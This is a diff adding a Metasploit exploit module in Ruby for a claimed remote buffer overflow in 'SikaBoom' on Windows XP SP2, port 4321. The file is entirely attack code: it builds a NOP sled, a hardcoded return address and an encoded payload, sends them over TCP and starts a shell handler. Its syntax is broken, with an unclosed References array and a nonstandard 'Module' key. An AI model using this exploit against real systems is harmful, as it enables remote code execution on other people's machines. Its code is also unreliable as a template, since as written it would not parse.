@@ -1,0 +1,64 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# web site for more information on licensing and terms of use.
+# http://metasploit.com/
+##
+ 
+require 'msf/core'
+ 
+class Metasploit3 < Msf::Exploit::Remote
+ 
+      include Msf::Exploit::Remote::Tcp
+ 
+      def initialize(info = {})
+                super(update_info(info,
+                        'Name'           => 'SikaBoom Remote Buffer overflow',
+                        'Description'    => %q{
+                                        This module exploits a buffer overflow in SikaBoom .
+                                             },
+                        'Module'         => [ 'Asesino04' ],
+      'References'     =>
+        [
+          [ 'Bug', 'http://1337day.com/exploit/16672' ],
+ 
+                        'DefaultOptions' =>
+                                {
+                                        'EXITFUNC' => 'process',
+                                },
+                        'Payload'        =>
+                                {
+                                        'Space'    => 268,
+                                        'BadChars' => "\x00\xff",
+                                },
+                        'Platform'       => 'win',
+ 
+                        'Targets'        =>
+                                [
+                                        ['Windows XP SP2 En',
+                                          { 'Ret' => 0x5D38827C, 'Offset' => 268 } ],
+                                ],
+                        'DefaultTarget' => 0,
+ 
+                        'Privileged'     => false
+                        ))
+ 
+                        register_options(
+                        [
+                                Opt::RPORT(4321)
+                        ], self.class)
+       end
+ 
+       def exploit
+          connect
+ 
+          junk = make_nops(target['Offset'])
+          sploit = junk + [target.ret].pack('V') + make_nops(50) + payload.encoded
+          sock.put(sploit)
+ 
+          handler
+          disconnect
+ 
+       end
+ 
+end
